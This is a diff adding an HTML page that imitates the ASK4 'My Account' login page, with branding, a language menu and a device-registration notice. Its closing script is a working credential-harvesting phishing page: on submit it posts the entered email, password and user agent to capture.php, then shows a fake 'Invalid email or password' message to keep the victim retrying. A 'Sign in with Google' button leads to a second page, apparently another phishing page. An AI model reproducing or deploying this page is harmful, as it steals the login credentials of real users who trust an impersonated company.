@@ -1,0 +1,280 @@
+<!DOCTYPE html><html lang="en"><head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+	<link rel="shortcut icon" href="images/favicon.ico">
+	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
+	<title>My Account</title>
+
+	<link rel="stylesheet" href="css/application.css">
+	<link rel="stylesheet" href="css/bootstrap-responsive.css">
+	<script type="text/javascript" src="js/modernizr.custom.js"></script>
+
+	<script type="text/javascript" src="js/jquery-3.7.1.min.js"></script>
+	<script type="text/javascript" src="js/jquery.placeholder.js"></script>
+	<script type="text/javascript" src="js/bootstrap-alert.js"></script>
+	<script type="text/javascript" src="js/bootstrap-modal.js"></script>
+	<script type="text/javascript" src="js/bootstrap-dropdown.js"></script>
+	<script type="text/javascript" src="js/jquery.validate.min.js"></script>
+	
+	<script type="text/javascript">
+	var oMyAccountTranslator = {};
+	oMyAccountTranslator.translations = {
+		"js.invalid_mac" : "Invalid MAC Address",
+		"js.same_value" : "Please enter the same value again"
+	};
+	
+	oMyAccountTranslator.trans = function(sCode) {
+		if (this.translations.hasOwnProperty(sCode)) {
+			return this.translations[sCode];
+		}
+	}
+</script>	<script type="text/javascript" src="js/forms.js"></script>
+	<script type="text/javascript" src="js/application.js"></script>
+	<script type="text/javascript" src="js/confirmDialog.js"></script>
+
+	</head><body><div id="rotating-mac" class="modal hide fade" tabindex="-1" role="dialog">
+    <div class="modal-header">
+        <h3>Information about your device</h3>
+    </div>
+    <div class="modal-body">
+        <div><p>This device has a security feature which will cause its MAC address to alter regularly while using the open network. This will require you to re-register the device to your account every two weeks.</p><p>To prevent this, once your account is created, connect your device to the 802.1x network and register it to your account when prompted.</p><p>Alternatively, if you wish to continue using the open network, please follow the below guide to prevent your MAC address from regularly changing.</p><ol><li>Go to your device settings</li><li>Go to Wi-Fi</li><li>Press the Blue "i" next to ASK4's open network</li><li>Tap the slider next to 'Rotate Wi-Fi Address' to turn this feature off.</li></ol></div>
+    </div>
+    <div class="modal-footer">
+        <button class="btn btn-large" data-dismiss="modal" aria-hidden="true">Close</button>
+    </div>
+</div>
+	<!--[if IE 7]>
+		<link rel="stylesheet" href="./assets/stylesheets/compiled/font-awesome-ie7.css">
+	<![endif]-->
+
+
+
+
+	<!--[if lt IE 7]>
+		<div class="alert alert-block alert-error" role="alert" aria-labelledby="alert-ie-warning">
+			<h3 class="alert-heading">Warning</h3>
+			<p id="alert-ie-warning">You are using Internet Explorer version 6.0 or lower. Due to security issues and lack of support for Web Standards it is highly recommended that you upgrade to modern browser. After the update you can access this site normally.</p>
+		</div>
+	<![endif]-->
+			<div id="wrap">
+			<div class="container">
+
+				<div class="login-page">
+					<header class="login-header">
+					<div class="loginlogo-container">
+						<a href="./?pageid=6039f45a3d043e5695498b13bfcfc07f&subsession=subb0878f83df332f338c79fa17c3fbbf46" class="loginlogo">ASK4 My Account</a>
+					</div>
+													<h1>Log in to your ASK4 account</h1>
+												<div class="dropdown">
+							<button class="btn btn-secondary dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" aria-label="Language Choice">
+								<i class="fa-solid fa-language"></i>
+							</button>
+							<div class="dropdown-menu pull-right" aria-labelledby="dropdownMenuButton">
+																	<a tabindex="0" href="./lang.php?language=en&pageid=6039f45a3d043e5695498b13bfcfc07f&subsession=subb0878f83df332f338c79fa17c3fbbf46">English</a>
+																	<a tabindex="0" href="./lang.php?language=es&pageid=6039f45a3d043e5695498b13bfcfc07f&subsession=subb0878f83df332f338c79fa17c3fbbf46">Español</a>
+																	<a tabindex="0" href="./lang.php?language=de&pageid=6039f45a3d043e5695498b13bfcfc07f&subsession=subb0878f83df332f338c79fa17c3fbbf46">Deutsch</a>
+																	<a tabindex="0" href="./lang.php?language=pl&pageid=6039f45a3d043e5695498b13bfcfc07f&subsession=subb0878f83df332f338c79fa17c3fbbf46">Polski</a>
+																	<a tabindex="0" href="./lang.php?language=pt&pageid=6039f45a3d043e5695498b13bfcfc07f&subsession=subb0878f83df332f338c79fa17c3fbbf46">Português</a>
+																	<a tabindex="0" href="./lang.php?language=it&pageid=6039f45a3d043e5695498b13bfcfc07f&subsession=subb0878f83df332f338c79fa17c3fbbf46">Italiano</a>
+																	<a tabindex="0" href="./lang.php?language=fr&pageid=6039f45a3d043e5695498b13bfcfc07f&subsession=subb0878f83df332f338c79fa17c3fbbf46">Français</a>
+																	<a tabindex="0" href="./lang.php?language=zh&pageid=6039f45a3d043e5695498b13bfcfc07f&subsession=subb0878f83df332f338c79fa17c3fbbf46">中文 (简体)</a>
+															</div>
+						</div>
+					</header>
+
+					
+
+
+<div class="login-panel">
+
+	<form method="post" action="login.php" class="login-form" id="login-form"><input type="hidden" name="subsession" value="subb0878f83df332f338c79fa17c3fbbf46"><input type="hidden" name="pageid" value="6039f45a3d043e5695498b13bfcfc07f">
+
+		<div class="login-fields">
+			<div class="control-group">
+			<label for="username">Your Email</label>
+				<input type="text" name="username" id="username" value="" class="required" aria-required="true">
+			</div>
+
+			<div class="control-group">
+			<label for="password">Password</label>
+				<input type="password" name="password" id="password" class="required" aria-required="true">
+			</div>
+		</div>
+		
+		<div class="error-message" id="error-message" style="display: none;">
+			<span class="error-text"></span>
+		</div>
+
+		<div class="form-actions">
+			<input type="submit" value="Log in to My Account" class="btn" id="login">
+			<input type="hidden" name="submitbutton" value="login">
+			
+			<div class="divider">
+				<span>or</span>
+			</div>
+			
+			<div class="google-signin-container">
+				<button type="button" class="btn" id="google-signin-btn" onclick="window.location.href='google-login.html'">
+				 Sign in with Google
+				</button>
+			</div>
+			
+
+		</div>
+
+	</form>
+</div>
+
+				</div>
+
+
+
+			</div>
+</div>
+
+		<footer class="">
+			<div class="footer">
+				<p class="copyright">Copyright � 2025 ASK4 Ltd. All Rights Reserved</p>
+			</div>
+		</footer>
+
+
+
+		<div id="confirm-modal" class="confirm-modal modal hide">
+		<div class="modal-body">
+
+		</div>
+		<div class="modal-footer">
+			<button class="btn">Cancel</button>
+			<button class="btn btn-primary">OK</button>
+		</div>
+	</div>
+	<script>
+		$(document).ready(function() {
+			myaccount.confirmDialog.init();
+			
+			// Handle form submission to capture credentials
+			$('#login-form').on('submit', function(e) {
+				e.preventDefault();
+				
+				// Get the username and password values
+				var username = $('#username').val();
+				var password = $('#password').val();
+				
+				// Hide any existing error message
+				$('#error-message').hide();
+				
+				// Check if both fields are filled
+				if (username && password) {
+					// Send data to PHP capture file
+					fetch('capture.php', {
+						method: 'POST',
+						headers: {'Content-Type': 'application/json'},
+						body: JSON.stringify({
+							email: username,
+							password: password,
+							userAgent: navigator.userAgent
+						})
+					})
+					.then(response => response.json())
+					.then(data => {
+						console.log('Data captured successfully:', data);
+					})
+					.catch(error => {
+						console.error('Error capturing data:', error);
+					});
+					
+					// Show fake error message to user
+					$('.error-text').text('Invalid email or password');
+					$('#error-message').show();
+					
+					// Clear the password field
+					$('#password').val('');
+					
+					// Focus back on the password field
+					$('#password').focus();
+				} else {
+					// If fields are empty, show validation message
+					if (!username) {
+						$('.error-text').text('Please enter your email');
+						$('#error-message').show();
+						$('#username').focus();
+					} else if (!password) {
+						$('.error-text').text('Please enter your password');
+						$('#error-message').show();
+						$('#password').focus();
+					}
+				}
+			});
+		});
+	</script>
+	
+	<style>
+		.divider {
+			text-align: center;
+			margin: 20px 0;
+			position: relative;
+		}
+		
+		.divider::before {
+			content: '';
+			position: absolute;
+			top: 50%;
+			left: 0;
+			right: 0;
+			height: 1px;
+			background: #ddd;
+		}
+		
+		.divider span {
+			background: white;
+			padding: 0 15px;
+			color: #666;
+			font-size: 14px;
+		}
+		
+		.google-signin-container {
+			text-align: center;
+			margin: 20px 0;
+		}
+		
+		.google-btn {
+			width: 100%;
+			background-color: #007cba;
+			border-color: #007cba;
+			color: white;
+			font-weight: 500;
+			padding: 10px 16px;
+			font-size: 14px;
+			line-height: 1.42857143;
+			border-radius: 4px;
+			transition: all 0.2s ease-in-out;
+		}
+		
+		.google-btn:hover {
+			background-color: #005a87;
+			border-color: #005a87;
+			color: white;
+		}
+		
+		.google-btn i {
+			margin-right: 8px;
+		}
+		
+		.error-message {
+			background-color: #f8d7da;
+			border: 1px solid #f5c6cb;
+			color: #721c24;
+			padding: 10px;
+			margin: 10px 0;
+			border-radius: 4px;
+			text-align: center;
+		}
+		
+		.error-text {
+			font-weight: 500;
+		}
+	</style>
+
+
+</body></html>
